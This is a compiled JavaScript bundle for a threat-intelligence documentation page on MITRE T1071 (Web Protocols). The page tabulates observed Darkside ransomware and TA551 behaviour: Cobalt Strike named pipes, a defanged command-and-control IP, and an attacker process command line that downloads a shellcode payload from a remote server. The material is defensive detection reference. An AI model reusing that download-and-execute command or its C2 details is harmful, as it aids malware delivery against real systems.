"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[7630],{4137:function(e,t,r){r.d(t,{Zo:function(){return s},kt:function(){return u}});var n=r(7294);function a(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function o(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function i(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?o(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function l(e,t){if(null==e)return{};var r,n,a=function(e,t){if(null==e)return{};var r,n,a={},o=Object.keys(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||(a[r]=e[r]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var c=n.createContext({}),m=function(e){var t=n.useContext(c),r=t;return e&&(r="function"==typeof e?e(t):i(i({},t),e)),r},s=function(e){var t=m(e.components);return n.createElement(c.Provider,{value:t},e.children)},p={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},d=n.forwardRef((function(e,t){var r=e.components,a=e.mdxType,o=e.originalType,c=e.parentName,s=l(e,["components","mdxType","originalType","parentName"]),d=m(r),u=a,h=d["".concat(c,".").concat(u)]||d[u]||p[u]||o;return r?n.createElement(h,i(i({ref:t},s),{},{components:r})):n.createElement(h,i({ref:t},s))}));function u(e,t){var r=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=r.length,i=new Array(o);i[0]=d;var l={};for(var c in t)hasOwnProperty.call(t,c)&&(l[c]=t[c]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var m=2;m<o;m++)i[m]=r[m];return n.createElement.apply(null,i)}return n.createElement.apply(null,r)}d.displayName="MDXCreateElement"},4286:function(e,t,r){r.r(t),r.d(t,{frontMatter:function(){return l},contentTitle:function(){return c},metadata:function(){return m},toc:function(){return s},default:function(){return d}});var n=r(7462),a=r(3366),o=(r(7294),r(4137)),i=["components"],l={},c=void 0,m={unversionedId:"Techniques/T1071 - Web Protocols",id:"Techniques/T1071 - Web Protocols",isDocsHomePage:!1,title:"T1071 - Web Protocols",description:"Found 4 references across 2 AC3 Threat Sightings. Enjoy!",source:"@site/docs/05-Techniques/T1071 - Web Protocols.md",sourceDirName:"05-Techniques",slug:"/Techniques/T1071 - Web Protocols",permalink:"/ac3-threat-sightings/docs/Techniques/T1071 - Web Protocols",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"T1071 - Application Layer Protocol",permalink:"/ac3-threat-sightings/docs/Techniques/T1071 - Application Layer Protocol"},next:{title:"T1071.001 - Application Layer Protocol- Web Protocols",permalink:"/ac3-threat-sightings/docs/Techniques/T1071.001 - Application Layer Protocol- Web Protocols"}},s=[{value:"From the AC3 Threat Sighting for <em>Darkside Ransomware</em>",id:"from-the-ac3-threat-sighting-for-darkside-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>TA551</em>",id:"from-the-ac3-threat-sighting-for-ta551",children:[]}],p={toc:s};function d(e){var t=e.components,r=(0,a.Z)(e,i);return(0,o.kt)("wrapper",(0,n.Z)({},p,r,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"Found 4 references across 2 AC3 Threat Sightings. Enjoy!"),(0,o.kt)("h2",{id:"from-the-ac3-threat-sighting-for-darkside-ransomware"},"From the AC3 Threat Sighting for ",(0,o.kt)("em",{parentName:"h2"},"Darkside Ransomware")),(0,o.kt)("p",null,"Full details at: ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml")),(0,o.kt)("table",null,(0,o.kt)("thead",{parentName:"table"},(0,o.kt)("tr",{parentName:"thead"},(0,o.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,o.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,o.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,o.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,o.kt)("tbody",{parentName:"table"},(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,o.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,o.kt)("em",{parentName:"td"},"Windows Services")," to launch Cobalt Strike beacon PE file for Command And Control."),(0,o.kt)("td",{parentName:"tr",align:null},"PE file connected to default Cobalt Strike named pipe (MSSE-*)."),(0,o.kt)("td",{parentName:"tr",align:null},(0,o.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,o.kt)("inlineCode",{parentName:"td"},"\\\\\\\\.\\\\pipe\\\\MSSE-5861-server"))),(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,o.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,o.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute ",(0,o.kt)("em",{parentName:"td"},"BloodHound")," in memory for Discovery."),(0,o.kt)("td",{parentName:"tr",align:null},"DLLHOST connected to default Cobalt Strike named pipe (postex_*)."),(0,o.kt)("td",{parentName:"tr",align:null},(0,o.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,o.kt)("inlineCode",{parentName:"td"},"\\\\\\\\.\\\\pipe\\\\postex_d0e7"))))),(0,o.kt)("h2",{id:"from-the-ac3-threat-sighting-for-ta551"},"From the AC3 Threat Sighting for ",(0,o.kt)("em",{parentName:"h2"},"TA551")),(0,o.kt)("p",null,"Full details at: ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml")),(0,o.kt)("table",null,(0,o.kt)("thead",{parentName:"table"},(0,o.kt)("tr",{parentName:"thead"},(0,o.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,o.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,o.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,o.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,o.kt)("tbody",{parentName:"table"},(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,o.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,o.kt)("em",{parentName:"td"},"Cobalt Strike shellcode runner")," to execute a remote payload for Command And Control."),(0,o.kt)("td",{parentName:"tr",align:null},"Shellcode runner connected to public server"),(0,o.kt)("td",{parentName:"tr",align:null},(0,o.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,o.kt)("inlineCode",{parentName:"td"},"89.163.140[.]101"))),(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,o.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,o.kt)("em",{parentName:"td"},"Cobalt Strike shellcode runner")," to execute a remote payload for Command And Control."),(0,o.kt)("td",{parentName:"tr",align:null},"Shellcode runner executed web payload (Cobalt Strike shellcode)"),(0,o.kt)("td",{parentName:"tr",align:null},(0,o.kt)("em",{parentName:"td"},"Process Created"),": ",(0,o.kt)("br",null),"- ",(0,o.kt)("inlineCode",{parentName:"td"},"jyheeckptwa.exe -u http://89[.]163.140.101:8000/download/abc.bin -t 1"))))))}d.isMDXComponent=!0}}]);